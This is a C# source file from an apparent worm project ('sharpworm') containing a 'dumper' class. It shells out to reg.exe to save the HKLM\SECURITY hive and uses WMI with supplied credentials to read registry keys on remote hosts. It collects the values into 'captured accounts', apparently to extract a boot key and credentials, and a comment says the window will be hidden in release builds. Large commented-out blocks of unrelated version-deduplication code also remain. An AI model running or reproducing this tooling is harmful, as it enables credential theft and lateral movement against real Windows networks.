using System;
using System.Collections.Generic;
using System.Text;
using System.Management;
using System.Reflection;
using Microsoft.Win32;
using System.Threading;
using System.Security.Permissions;
using System.Diagnostics;

[assembly: RegistryPermissionAttribute(SecurityAction.RequestMinimum,
Read = @"HKEY_Local_Machine")]
[assembly: SecurityPermissionAttribute(SecurityAction.RequestMinimum,
UnmanagedCode = true)]

namespace sharpworm
{
    public class dumper
    {
        const uint LOCAL_MACHINE = 0x80000002;
        const uint CLASSES_ROOT = 0x80000000;
        const uint CURRENT_USER = 0x80000001;
        const uint USERS = 0x80000003;
        const uint CURRENT_CONFIG = 0x80000005;
        const uint DYN_DATA = 0x80000006;
        RegistryKey environmentKey;
        string remoteName = string.Empty;

        int bootkey = 0;

        public enum RegType
        {
            REG_SZ = 1,
            REG_EXPAND_SZ,
            REG_BINARY,
            REG_DWORD,
            REG_MULTI_SZ = 7
        }

        public void reg_dump()
        {
            //useful on win2k3,2k8,Vista, and 7 boxes :-)
            Process proc = new Process();

            proc.StartInfo.FileName = "reg.exe";
            proc.StartInfo.Arguments = "SAVE HKLM\\SECURITY security.hive";
            proc.StartInfo.WindowStyle = ProcessWindowStyle.Normal;     //debug, this will be CreateNoWindow in release
            proc.Start();
            proc.WaitForExit();
            
            
            //reg SAVE HKLM\SECURITY
            //accounts List will keep track our captured accounts

        }

        public List<accounts> WMI_REG(string remoteHostName, string userName, string password, string basekey, string key)
        {
            List<accounts> acc = new List<accounts>();

            ManagementScope ms = null;
            ConnectionOptions wmiServiceOptions = new ConnectionOptions();
            wmiServiceOptions.Impersonation = ImpersonationLevel.Impersonate;
            wmiServiceOptions.Authentication = AuthenticationLevel.PacketPrivacy;

            string connectionString = string.Format("\\\\{0}\\root\\default", remoteHostName);
            try
            {
                if (remoteHostName != "." && remoteHostName != "localhost" && userName != "$using current credentials")
                {

                    wmiServiceOptions.Username = userName;
                    wmiServiceOptions.Password = password;
                    ms = new ManagementScope(connectionString, wmiServiceOptions);
                }
                else
                {
                    ms = new ManagementScope(connectionString, wmiServiceOptions);
                }


                ManagementClass registry = new ManagementClass(ms, new ManagementPath("StdRegProv"), null);
                //ManagementBaseObject inParams=
                //ManagementBaseObject inParams = registry.GetMethodParameters("GetStringValue");
                ManagementBaseObject inParams = registry.GetMethodParameters("EnumKey");
                Console.WriteLine("Returning a specific value for a specified key is done");
                uint HKEY = new uint();
                if (basekey == "HKLM")
                    HKEY = LOCAL_MACHINE;
                if (basekey == "HKCU")
                    HKEY = CURRENT_USER;

                inParams.SetPropertyValue("hDefKey", HKEY);
                inParams.SetPropertyValue("sSubKeyName", key);

                //inParams["hDefKey"] = LOCAL_MACHINE;
                //inParams["sSubKeyName"] = key;

                string[] error = (string[])registry.InvokeMethod("EnumKey", inParams, null).Properties["sNames"].Value;

                foreach (string k in error)
                {
                    try
                    {
                        if (k.Contains("Data"))
                        {
                            accounts resultItem = new accounts();
                            //string[] subs = (string[])registry.InvokeMethod("EnumKey", inParams, null).Properties["sNames"].Value;
                            inParams = registry.GetMethodParameters("EnumValues");
                            inParams.SetPropertyValue("hDefKey", LOCAL_MACHINE);
                            inParams.SetPropertyValue("sSubKeyName", key + "\\" + k);

                            Type t = resultItem.GetType();
                            string[] information = (string[])registry.InvokeMethod("EnumValues", inParams, null).Properties["sNames"].Value;
                            //string[] types = (string[])registry.InvokeMethod("EnumValues", inParams, null).Properties["Types"].Value;
                            foreach (PropertyInfo p in t.GetProperties())
                            {
                                for (int i = 0; i < information.Length; i++)
                                {
                                    if (p.Name == information[i])
                                    {
                                        uint youint = System.Convert.ToUInt32(inParams["hDefKey"].ToString());
                                        inParams = registry.GetMethodParameters("GetStringValue");
                                        inParams.SetPropertyValue("hDefKey", LOCAL_MACHINE);
                                        inParams.SetPropertyValue("sSubKeyName", key + "\\" + k);
                                        inParams.SetPropertyValue("sValueName", p.Name);

                                        RegType rType = GetValueType(registry, youint, inParams["sSubKeyName"].ToString(), inParams["sValueName"].ToString());
                                        ManagementClass mc = registry;
                                        object oValue = null;
                                        try
                                        {
                                        switch (rType)
                                        {
                                            case RegType.REG_SZ:
                                                ManagementBaseObject outParams = mc.InvokeMethod("GetStringValue", inParams, null);

                                                if (Convert.ToUInt32(outParams["ReturnValue"]) == 0)
                                                {
                                                    oValue = outParams["sValue"];
                                                }
                                                else
                                                {
                                                    // GetStringValue call failed
                                                }
                                                break;

                                            case RegType.REG_EXPAND_SZ:
                                                outParams = mc.InvokeMethod("GetExpandedStringValue", inParams, null);

                                                if (Convert.ToUInt32(outParams["ReturnValue"]) == 0)
                                                {
                                                    oValue = outParams["sValue"];
                                                }
                                                else
                                                {
                                                    // GetExpandedStringValue call failed
                                                }
                                                break;

                                            case RegType.REG_MULTI_SZ:
                                                outParams = mc.InvokeMethod("GetMultiStringValue", inParams, null);

                                                if (Convert.ToUInt32(outParams["ReturnValue"]) == 0)
                                                {
                                                    oValue = outParams["sValue"];
                                                }
                                                else
                                                {
                                                    // GetMultiStringValue call failed
                                                }
                                                break;

                                            case RegType.REG_DWORD:
                                                outParams = mc.InvokeMethod("GetDWORDValue", inParams, null);

                                                if (Convert.ToUInt32(outParams["ReturnValue"]) == 0)
                                                {
                                                    oValue = outParams["uValue"];
                                                }
                                                else
                                                {
                                                    // GetDWORDValue call failed
                                                }
                                                break;

                                            case RegType.REG_BINARY:
                                                outParams = mc.InvokeMethod("GetBinaryValue", inParams, null);

                                                if (Convert.ToUInt32(outParams["ReturnValue"]) == 0)
                                                {
                                                    oValue = outParams["uValue"] as byte[];
                                                }
                                                else
                                                {
                                                    // GetBinaryValue call failed
                                                }
                                                break;
                                                
                                        }
                                        p.SetValue(resultItem, oValue, null);
                                            //p.SetValue(resultItem, this.FixString(registry.InvokeMethod("GetStringValue", inParams, null).Properties["sValue"].Value), null);
                                            //p.SetValue(resultItem, this.FixString(registry.InvokeMethod("GetBinaryValue", inParams, null).Properties["sValue"].Value), null);
                                        }
                                        catch
                                        {
                                            
                                        }
                                        break;
                                    }
                                }
                            }
                            if (resultItem.Pattern.Length > 0)
                            {
                                Array.Reverse(resultItem.Pattern);
                                //bootkey << System.Convert.ToInt16(resultItem.Pattern);
                                
                                acc.Add(resultItem);
                            }
                        }
                    }
                    catch
                    {

                    }
                }
                ////inParams["sValueName"] = keyToRead;
                //Console.WriteLine("Invoking Method");
                ////object[] args;
                //ManagementBaseObject outParams = registry.InvokeMethod("EnumKey", inParams, null);
                //Console.WriteLine("Invoking Method");

                //Console.WriteLine(outParams["sValue"].ToString());
                //error[0] = outParams["sValue"].ToString();
        //    }
        //    catch (Exception ex)
        //    {

        //    }
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error!");
            }
            return acc;
        }
        //    //we need to set the display version first
        //    //ParseInt() on displayname, if 
        //    var newList = r1.OrderBy(x => x.DisplayName).ToList();
        //    try
        //    {
        //        for (int i = 0; i < newList.Count - 1; i++)
        //        {
        //            //set display version first if no display version info exists
        //            if (String.IsNullOrEmpty(newList[i].DisplayVersion))
        //            {
        //                if (!(String.IsNullOrEmpty(newList[i].VersionMajor)))
        //                {
        //                    if (!(String.IsNullOrEmpty(newList[i].VersionMinor)))
        //                    {
        //                        newList[i].DisplayVersion = newList[i].VersionMajor + "." + newList[i].VersionMinor;
        //                    }
        //                    else
        //                        newList[i].DisplayVersion = newList[i].VersionMajor + ".0";
        //                }
        //                else
        //                {
        //                    try
        //                    {
        //                        string holder = String.Empty;
        //                        char[] charray = newList[i].DisplayName.ToCharArray();
        //                        foreach (char c in charray)
        //                        {
        //                            int number = 0;
        //                            bool result = Int32.TryParse(c.ToString(), out number);
        //                            if (result || c == '.')
        //                            {
        //                                holder += c.ToString();
        //                            }


        //                        }
        //                        if (!String.IsNullOrEmpty(holder))
        //                        {
        //                            newList[i].DisplayVersion = holder;
        //                        }
        //                        else
        //                            newList[i].DisplayVersion = "unk";
        //                        //newList[i].DisplayVersion = Double.Parse(newList[i].DisplayName).ToString();
        //                    }
        //                    catch
        //                    {
        //                        newList[i].DisplayVersion = "unk";
        //                    }
        //                }
        //            }

        //            for (int k = 1; k < newList.Count - 1; k++)
        //            {
        //                if (newList[i].DisplayName == newList[i + k].DisplayName)
        //                {
        //                    if (newList[i].DisplayVersion == newList[i + k].DisplayVersion)
        //                    {
        //                        bool different = false;

        //                        for (int j = 0; j < newList.GetType().GetProperties().Length; j++)
        //                        {
        //                            PropertyInfo p = newList[i].GetType().GetProperties()[j];
        //                            string first = p.GetValue(newList[i], null).ToString();
        //                            if (first == newList[i + k].GetType().GetProperties()[j].GetValue(newList[i + k], null).ToString())
        //                            {

        //                            }
        //                            else
        //                            {
        //                                different = true;
        //                                if (String.IsNullOrEmpty(newList[i].GetType().GetProperties()[j].GetValue(newList[i], null).ToString()))
        //                                {
        //                                    newList[i].GetType().GetProperties()[j].SetValue(newList[i + k], j, null);
        //                                }


        //                            }
        //                        }
        //                        if (!different)
        //                        {
        //                            //if we aren't different, we are a dupe.
        //                            //remove at once

        //                            newList.RemoveAt(i + k);
        //                            k--;

        //                        }
        //                    }
        //                }
        //                else
        //                {
        //                    break;
        //                }
        //            }
        //        }
        //    }
        //    catch
        //    {

        //    }
        //    var noDupes = newList.Distinct().ToList();
        //    return noDupes;
        //}
        private string FixString(object data)
        {
            string resultValue = string.Empty;

            if (data != null)
            {
                resultValue = Convert.ToString(data);
            }

            return resultValue;
        }

        public static RegType GetValueType(ManagementClass mc, uint hDefKey, string sSubKeyName, string sValueName)
        {
            ManagementBaseObject inParams = mc.GetMethodParameters("EnumValues");
            inParams["hDefKey"] = hDefKey;
            inParams["sSubKeyName"] = sSubKeyName;

            ManagementBaseObject outParams = mc.InvokeMethod("EnumValues", inParams, null);

            if (Convert.ToUInt32(outParams["ReturnValue"]) == 0)
            {
                string[] sNames = outParams["sNames"] as String[];
                int[] iTypes = outParams["Types"] as int[];

                for (int i = 0; i < sNames.Length; i++)
                {
                    if (sNames[i] == sValueName)
                    {
                        return (RegType)iTypes[i];
                    }
                }
                // value not found
                return (RegType)1;
            }
            else
            {
                return (RegType)0;
            }
        }
    }
}

